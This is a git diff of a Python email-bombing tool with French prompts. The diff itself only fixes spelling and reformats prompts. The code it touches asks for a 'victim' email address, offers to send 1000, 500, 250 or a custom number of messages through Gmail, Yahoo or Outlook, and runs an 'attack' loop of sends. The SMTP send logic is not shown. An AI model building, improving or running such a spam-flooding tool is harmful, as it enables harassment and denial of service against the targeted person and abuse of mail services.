@@ -43,7 +43,7 @@ class Email_Bomber:
         try:
             print(bcolors.RED + '\n\~~~1ère étape du script~~~/')
             self.target = str(input(bcolors.GREEN + 'Écrit l adresse mail de ta victime ➡️ : '))
-            self.mode = int(input(bcolors.GREEN + 'Choisis l option qui te conviens (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
+            self.mode = int(input(bcolors.GREEN + 'Choisis l option qui te convient || 1:(1000) 2:(500) 3:(250) 4:(personnalisable) ➡️ : '))
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print('ERROR: Option invalide. Aurevoir.')
                 sys.exit(1)
@@ -62,14 +62,14 @@ class Email_Bomber:
                 self.amount = int(250)
             else:
                 self.amount = int(input(bcolors.GREEN + 'Combien de Spam vont être envoyés ? : '))
-            print(bcolors.RED + f'\n+[+[+[ Tu as sélectionné l option: {self.mode} et {self.amount} emails seront envoyés ]+]+]+')
+            print(bcolors.RED + f'\n\~~~Tu as sélectionné l option: {self.mode} et {self.amount} emails seront envoyés~~~/')
         except Exception as e:
             print(f'ERROR: {e}')
 
     def email(self):
         try:
             print(bcolors.RED + '\n\~~~Dernière étape du script~~~/')
-            self.server = str(input(bcolors.GREEN + 'Écirit ➡️ : 1:Gmail 2:Yahoo 3:Outlook <: '))
+            self.server = str(input(bcolors.GREEN + 'Écrit : 1:Gmail 2:Yahoo 3:Outlook ➡️ : '))
             premade = ['1', '2', '3']
             default_port = True
             if self.server not in premade:
@@ -112,7 +112,7 @@ class Email_Bomber:
             print(f'ERROR: {e}')
 
     def attack(self):
-        print(bcolors.RED + '\n \~~~Attaque en cours...~~~/')
+        print(bcolors.RED + '\n \~~~Attaque en cours~~~/')
         for email in range(self.amount+1):
             self.send()
         self.s.close()
